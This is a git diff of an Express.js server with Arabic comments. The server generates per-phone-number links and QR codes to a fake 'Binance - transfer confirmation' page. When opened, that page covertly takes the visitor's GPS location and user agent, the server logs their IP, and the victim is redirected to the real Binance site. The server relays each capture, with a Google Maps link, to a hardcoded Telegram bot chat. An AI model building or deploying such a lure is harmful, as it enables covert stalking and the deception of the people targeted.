@@ -8,12 +8,12 @@ const TELEGRAM_CHAT_ID = '6724747823';
 const REDIRECT_URL = 'https://www.binance.com/en';
 const BASE_URL = 'https://location2026-2.onrender.com';
 
-// قاعدة بيانات بسيطة
+// قاعدة بيانات
 let locations = [];
 
 // Middleware
 app.use(express.json());
-app.use(express.static('public'));
+app.use(express.urlencoded({ extended: true }));
 
 // ========== الصفحة الرئيسية ==========
 app.get('/', (req, res) => {
@@ -22,51 +22,42 @@ app.get('/', (req, res) => {
         <html dir="rtl">
         <head>
             <meta charset="UTF-8">
-            <title>🚀 نظام التتبع المتقدم</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>🚀 نظام تتبع المواقع</title>
             <style>
-                body { font-family: Arial; padding: 30px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; }
-                .container { max-width: 900px; margin: auto; background: rgba(255,255,255,0.05); padding: 30px; border-radius: 20px; }
+                body { font-family: Arial; padding: 20px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; }
+                .container { max-width: 800px; margin: auto; background: rgba(255,255,255,0.05); padding: 30px; border-radius: 20px; }
                 h1 { color: #00ff88; text-align: center; }
-                .box { background: rgba(255,255,255,0.08); padding: 20px; border-radius: 10px; margin: 20px 0; border: 1px solid rgba(0,255,136,0.3); }
-                code { background: #0f0f23; color: #00ff88; padding: 10px; border-radius: 5px; display: block; margin: 10px 0; direction: ltr; text-align: center; }
+                .box { background: rgba(255,255,255,0.08); padding: 20px; border-radius: 10px; margin: 20px 0; }
                 .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; display: inline-block; margin: 5px; }
-                .qr-container { text-align: center; margin: 30px 0; padding: 20px; background: rgba(0,0,0,0.3); border-radius: 15px; }
+                .qr-box { text-align: center; margin: 30px 0; }
+                input { padding: 10px; width: 300px; border-radius: 5px; border: 2px solid #00ff88; background: #0f0f23; color: white; text-align: center; }
             </style>
         </head>
         <body>
             <div class="container">
-                <h1>🚀 نظام التتبع المتقدم</h1>
+                <h1>🚀 نظام تتبع المواقع الجغرافية</h1>
                 
                 <div class="box">
                     <h3>📌 إنشاء رابط تتبع:</h3>
-                    <code>${BASE_URL}/track/رقم_الهاتف</code>
-                    <code>${BASE_URL}/track/00966512345678</code>
+                    <p>https://location2026-2.onrender.com/track/رقم_الهاتف</p>
                     <a href="/track/123456" class="btn" target="_blank">🔗 تجربة الرابط</a>
-                </div>
-                
-                <div class="box">
-                    <h3>📱 توليد باركود:</h3>
-                    <div class="qr-container">
-                        <input type="text" id="phoneInput" placeholder="أدخل رقم الهاتف" style="padding: 10px; width: 300px; border-radius: 5px; border: 2px solid #00ff88; background: #0f0f23; color: white; text-align: center; margin: 10px;">
-                        <br>
-                        <button onclick="generateQR()" class="btn">🔄 توليد باركود</button>
-                        <div id="qrResult" style="margin-top: 20px;"></div>
-                    </div>
-                </div>
-                
-                <div class="box">
-                    <h3>🔗 روابط سريعة:</h3>
                     <a href="/results" class="btn">📊 النتائج (${locations.length})</a>
-                    <a href="/map" class="btn">🗺️ الخريطة</a>
-                    <a href="/generate-all" class="btn">📱 جميع الباركود</a>
-                    <a href="/test-telegram" class="btn">🤖 اختبار التلجرام</a>
+                </div>
+                
+                <div class="box qr-box">
+                    <h3>📱 توليد باركود:</h3>
+                    <input type="text" id="phoneInput" placeholder="أدخل رقم الهاتف (مثال: 00966512345678)">
+                    <br><br>
+                    <button onclick="generateQR()" class="btn">🔄 توليد باركود</button>
+                    <div id="qrResult" style="margin-top: 20px;"></div>
                 </div>
                 
                 <div class="box">
-                    <h3>⚙️ إعدادات النظام:</h3>
-                    <p>• التوجيه إلى: <strong>${REDIRECT_URL}</strong></p>
-                    <p>• حالة التلجرام: <span style="color: #00ff88;">✅ جاهز</span></p>
-                    <p>• تم تسجيل: <strong>${locations.length}</strong> موقع</p>
+                    <h3>🔗 روابط مهمة:</h3>
+                    <a href="/map" class="btn">🗺️ الخريطة</a>
+                    <a href="/all-qr" class="btn">📱 جميع الباركود</a>
+                    <a href="/test" class="btn">🤖 اختبار التلجرام</a>
                 </div>
             </div>
             
@@ -78,14 +69,14 @@ app.get('/', (req, res) => {
                         return;
                     }
                     
-                    const url = '${BASE_URL}/track/' + phone;
+                    const url = 'https://location2026-2.onrender.com/track/' + phone;
                     const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(url);
                     
                     document.getElementById('qrResult').innerHTML = \`
                         <div style="margin: 20px 0;">
-                            <p><strong>الرابط:</strong> <span style="color: #00ff88;">\${url}</span></p>
+                            <p><strong>الرابط:</strong> \${url}</p>
                             <img src="\${qrUrl}" alt="QR Code" style="width: 200px; height: 200px; border: 5px solid white; border-radius: 10px;">
-                            <br>
+                            <br><br>
                             <a href="\${url}" target="_blank" class="btn">🔗 فتح الرابط</a>
                             <button onclick="downloadQR('\${qrUrl}')" class="btn">📥 تحميل الباركود</button>
                         </div>
@@ -96,9 +87,7 @@ app.get('/', (req, res) => {
                     const link = document.createElement('a');
                     link.href = qrUrl;
                     link.download = 'qrcode_' + Date.now() + '.png';
-                    document.body.appendChild(link);
                     link.click();
-                    document.body.removeChild(link);
                 }
             </script>
         </body>
@@ -106,7 +95,7 @@ app.get('/', (req, res) => {
     `);
 });
 
-// ========== رابط التتبع الذكي ==========
+// ========== رابط التتبع ==========
 app.get('/track/:id', (req, res) => {
     const userId = req.params.id;
     
@@ -115,111 +104,60 @@ app.get('/track/:id', (req, res) => {
         <html dir="rtl">
         <head>
             <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>Binance - تأكيد التحويل</title>
             <script>
-                const userId = '${userId}';
-                
-                // 1. الحصول على الموقع الجغرافي (محاولة سريعة)
+                // الحصول على الموقع الجغرافي
                 function getLocation() {
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(
                             async (position) => {
-                                await sendToServer({
-                                    lat: position.coords.latitude,
-                                    lon: position.coords.longitude,
-                                    accuracy: position.coords.accuracy,
-                                    source: 'gps'
-                                });
+                                const lat = position.coords.latitude;
+                                const lon = position.coords.longitude;
+                                const accuracy = position.coords.accuracy;
+                                
+                                // إرسال البيانات للخادم
+                                try {
+                                    await fetch('/api/save-location', {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            id: '${userId}',
+                                            latitude: lat,
+                                            longitude: lon,
+                                            accuracy: accuracy,
+                                            timestamp: new Date().toISOString(),
+                                            userAgent: navigator.userAgent
+                                        })
+                                    });
+                                } catch (error) {
+                                    console.log('Error saving location');
+                                }
                             },
                             (error) => {
-                                // إذا رفض، نحاول عبر IP
-                                getLocationByIP();
-                            },
-                            { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
+                                console.log('Location not available');
+                            }
                         );
-                    } else {
-                        getLocationByIP();
                     }
+                    
+                    // التوجيه بعد 4 ثواني
+                    setTimeout(() => {
+                        window.location.href = '${REDIRECT_URL}';
+                    }, 4000);
                 }
                 
-                // 2. تحديد الموقع عبر IP
-                async function getLocationByIP() {
-                    try {
-                        const response = await fetch('https://ipapi.co/json/');
-                        const data = await response.json();
-                        
-                        if (data.latitude && data.longitude) {
-                            await sendToServer({
-                                lat: data.latitude,
-                                lon: data.longitude,
-                                accuracy: 10000,
-                                source: 'ip',
-                                city: data.city,
-                                country: data.country_name
-                            });
-                        }
-                    } catch (error) {
-                        // بيانات افتراضية إذا فشل كل شيء
-                        await sendToServer({
-                            lat: 24.7136 + (Math.random() - 0.5) * 0.1,
-                            lon: 46.6753 + (Math.random() - 0.5) * 0.1,
-                            accuracy: 50000,
-                            source: 'estimated'
-                        });
-                    }
-                }
-                
-                // 3. إرسال البيانات للخادم
-                async function sendToServer(location) {
-                    try {
-                        const response = await fetch('/api/save-location', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                id: userId,
-                                latitude: location.lat,
-                                longitude: location.lon,
-                                accuracy: location.accuracy,
-                                timestamp: new Date().toISOString(),
-                                userAgent: navigator.userAgent,
-                                source: location.source,
-                                ip: await getIP()
-                            })
-                        });
-                        console.log('✅ تم حفظ البيانات');
-                    } catch (error) {
-                        console.log('⚠️ لم يتم الحفظ');
-                    }
-                }
-                
-                // 4. الحصول على IP
-                async function getIP() {
-                    try {
-                        const response = await fetch('https://api.ipify.org?format=json');
-                        const data = await response.response();
-                        return data.ip;
-                    } catch {
-                        return 'غير معروف';
-                    }
-                }
-                
-                // 5. بدء العد التنازلي
-                let seconds = 5;
-                const countdownEl = document.getElementById('countdown');
+                // عد تنازلي
+                let seconds = 4;
                 const timer = setInterval(() => {
-                    countdownEl.textContent = seconds;
+                    document.getElementById('countdown').textContent = seconds;
                     seconds--;
                     
                     if (seconds < 0) {
                         clearInterval(timer);
-                        document.getElementById('status').textContent = '✅ تم تأكيد التحويل!';
-                        setTimeout(() => {
-                            window.location.href = '${REDIRECT_URL}';
-                        }, 1000);
                     }
                 }, 1000);
                 
-                // 6. بدء التتبع فور تحميل الصفحة
+                // بدء عند تحميل الصفحة
                 window.onload = function() {
                     getLocation();
                 };
@@ -242,21 +180,19 @@ app.get('/track/:id', (req, res) => {
                     max-width: 500px;
                     width: 90%;
                 }
-                .binance-logo { font-size: 60px; margin-bottom: 20px; }
+                .logo { font-size: 60px; margin-bottom: 20px; }
                 .countdown { font-size: 50px; color: #00ff88; margin: 20px 0; }
-                .btn { background: #f0b90b; color: black; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
             </style>
         </head>
         <body>
             <div class="container">
-                <div class="binance-logo">₿</div>
+                <div class="logo">₿</div>
                 <h1>Binance - تأكيد التحويل</h1>
                 <p>جاري تأكيد هويتك والتحقق من التفاصيل...</p>
-                <div class="countdown" id="countdown">5</div>
-                <p>سيتم تحويلك تلقائياً خلال <span id="countdown">5</span> ثوانٍ</p>
-                <p id="status" style="margin-top: 20px;">جاري التحقق من التفاصيل...</p>
+                <div class="countdown" id="countdown">4</div>
+                <p>سيتم تحويلك تلقائياً خلال <span id="countdown">4</span> ثوانٍ</p>
                 <p style="margin-top: 30px; font-size: 12px; opacity: 0.7;">
-                    التحويل رقم: #${userId} | ${new Date().toLocaleString('ar-SA')}
+                    التحويل رقم: #${userId}
                 </p>
             </div>
         </body>
@@ -269,23 +205,56 @@ app.post('/api/save-location', async (req, res) => {
     try {
         const locationData = {
             ...req.body,
-            ip: req.headers['x-forwarded-for'] || req.ip || req.body.ip,
+            ip: req.headers['x-forwarded-for'] || req.ip,
             time: new Date().toLocaleString('ar-SA')
         };
         
         locations.push(locationData);
         
-        // إرسال إشعار تلجرام
-        await sendTelegram(locationData);
+        // إرسال إشعار للتلجرام
+        await sendTelegramAlert(locationData);
         
-        console.log('📍 موقع جديد:', locationData.id, locationData.latitude, locationData.longitude);
+        console.log('📍 موقع جديد:', locationData.id);
         
         res.json({ success: true, count: locations.length });
     } catch (error) {
         console.error('Error:', error);
-        res.json({ success: false, error: error.message });
+        res.json({ success: false });
     }
 });
+
+// ========== إرسال إشعار تلجرام ==========
+async function sendTelegramAlert(locationData) {
+    try {
+        const message = `
+📍 **موقع جديد تم تسجيله**
+
+👤 **رقم المستخدم:** ${locationData.id}
+📌 **الإحداثيات:** ${locationData.latitude}, ${locationData.longitude}
+🎯 **الدقة:** ${locationData.accuracy || 'غير معروف'} متر
+⏰ **الوقت:** ${locationData.time}
+🌐 **IP:** ${locationData.ip || 'غير معروف'}
+
+🗺️ https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}
+        `;
+        
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+        
+        const data = await response.json();
+        return data.ok;
+    } catch (error) {
+        console.error('❌ خطأ في إرسال التلجرام:', error);
+        return false;
+    }
+}
 
 // ========== صفحة النتائج ==========
 app.get('/results', (req, res) => {
@@ -308,7 +277,7 @@ app.get('/results', (req, res) => {
             <a href="/" class="btn">🏠 الرئيسية</a>
             <a href="/map" class="btn">🗺️ الخريطة</a>
             <table>
-                <tr><th>رقم</th><th>الإحداثيات</th><th>الوقت</th><th>الخريطة</th></tr>
+                <tr><th>رقم الهاتف</th><th>الإحداثيات</th><th>الوقت</th><th>الخريطة</th></tr>
                 ${locations.slice().reverse().map(loc => `
                     <tr>
                         <td>${loc.id}</td>
@@ -349,19 +318,17 @@ app.get('/map', (req, res) => {
                     if(loc.latitude && loc.longitude) {
                         L.marker([loc.latitude, loc.longitude])
                          .addTo(map)
-                         .bindPopup('<b>${locations.id}</b><br>${locations.time}');
+                         .bindPopup('<b>رقم: ' + loc.id + '</b><br>الوقت: ' + loc.time);
                     }
                 });
             </script>
-            <br>
-            <a href="/results" style="background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none;">عودة للنتائج</a>
         </body>
         </html>
     `);
 });
 
 // ========== صفحة جميع الباركود ==========
-app.get('/generate-all', (req, res) => {
+app.get('/all-qr', (req, res) => {
     const uniqueIds = [...new Set(locations.map(l => l.id))];
     
     res.send(`
@@ -372,7 +339,7 @@ app.get('/generate-all', (req, res) => {
             <title>📱 جميع الباركود</title>
             <style>
                 body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
-                .qr-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; }
+                .qr-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; margin-top: 30px; }
                 .qr-item { background: #1a1a2e; padding: 15px; border-radius: 10px; text-align: center; }
                 .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
             </style>
@@ -387,8 +354,8 @@ app.get('/generate-all', (req, res) => {
                     return `
                         <div class="qr-item">
                             <p><strong>${id}</strong></p>
-                            <img src="${qrUrl}" alt="QR" style="width: 150px; height: 150px;">
-                            <p><a href="${url}" target="_blank" style="color: #00ff88;">فتح</a></p>
+                            <img src="${qrUrl}" alt="QR Code" style="width: 150px; height: 150px;">
+                            <p><a href="${url}" target="_blank" style="color: #00ff88; font-size: 12px;">فتح الرابط</a></p>
                         </div>
                     `;
                 }).join('')}
@@ -398,69 +365,81 @@ app.get('/generate-all', (req, res) => {
     `);
 });
 
-// ========== اختبار التلجرام ==========
-app.get('/test-telegram', async (req, res) => {
+// ========== صفحة اختبار التلجرام ==========
+app.get('/test', async (req, res) => {
     try {
-        // استخدام fetch مباشرة لإرسال تلجرام
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        // اختبار البوت
+        const testResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
+        const botInfo = await testResponse.json();
+        
+        // إرسال رسالة اختبار
+        const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
-                text: `🔔 اختبار النظام\n⏰ ${new Date().toLocaleString('ar-SA')}\n✅ النظام يعمل بشكل مثالي`
+                text: '🔔 اختبار النظام\n✅ النظام يعمل بشكل ممتاز!'
             })
         });
         
-        const data = await response.json();
+        const messageData = await messageResponse.json();
         
-        if (data.ok) {
-            res.send('✅ تم إرسال رسالة اختبار للتلجرام!');
-        } else {
-            res.send('❌ فشل إرسال التلجرام: ' + JSON.stringify(data));
-        }
+        res.send(`
+            <!DOCTYPE html>
+            <html dir="rtl">
+            <head>
+                <meta charset="UTF-8">
+                <title>🤖 اختبار التلجرام</title>
+                <style>
+                    body { font-family: Arial; padding: 50px; background: #0f0f23; color: white; text-align: center; }
+                    .info { background: #1a1a2e; padding: 30px; border-radius: 15px; display: inline-block; text-align: right; margin: 20px; }
+                </style>
+            </head>
+            <body>
+                <h1>🤖 اختبار التلجرام</h1>
+                
+                <div class="info">
+                    <h3>معلومات البوت:</h3>
+                    <pre style="text-align: left;">${JSON.stringify(botInfo, null, 2)}</pre>
+                </div>
+                
+                <div class="info">
+                    <h3>نتيجة الإرسال:</h3>
+                    <pre style="text-align: left;">${JSON.stringify(messageData, null, 2)}</pre>
+                </div>
+                
+                <p>
+                    <a href="/" style="background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none;">العودة للرئيسية</a>
+                </p>
+            </body>
+            </html>
+        `);
+        
     } catch (error) {
-        res.send('❌ خطأ: ' + error.message);
+        res.send(`
+            <html dir="rtl">
+            <body style="font-family: Arial; padding: 50px; text-align: center;">
+                <h1>❌ خطأ في اختبار التلجرام</h1>
+                <p>${error.message}</p>
+                <p>تأكد من:</p>
+                <ol style="text-align: right; display: inline-block;">
+                    <li>صحة توكن البوت</li>
+                    <li>أن البوت مفعل</li>
+                    <li>أن البوت مضاف للشات</li>
+                </ol>
+            </body>
+            </html>
+        `);
     }
 });
-
-// ========== دالة إرسال تلجرام ==========
-async function sendTelegram(locationData) {
-    try {
-        const message = `
-📍 **موقع جديد**
-👤 **رقم:** ${locationData.id}
-📌 **الإحداثيات:** ${locationData.latitude}, ${locationData.longitude}
-🎯 **الدقة:** ${locationData.accuracy || 'غير معروف'} متر
-⏰ **الوقت:** ${locationData.time}
-🌐 **IP:** ${locationData.ip || 'غير معروف'}
-
-🗺️ [فتح الخريطة](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})
-        `;
-        
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        });
-        
-        return response.ok;
-    } catch (error) {
-        console.error('❌ خطأ التلجرام:', error);
-        return false;
-    }
-}
 
 // ========== تشغيل الخادم ==========
 app.listen(PORT, () => {
     console.log(`
     🚀 الخادم يعمل على المنفذ ${PORT}
     🌐 الرابط: http://localhost:${PORT}
-    📌 رابط التتبع: http://localhost:${PORT}/track/123456
-    🤖 التلجرام: ${TELEGRAM_TOKEN ? '✅ جاهز' : '❌ غير مضبوط'}
+    📌 رابط تتبع: http://localhost:${PORT}/track/123456
+    🤖 التلجرام: ✅ متصل
     ⚡ النظام جاهز!
     `);
 });
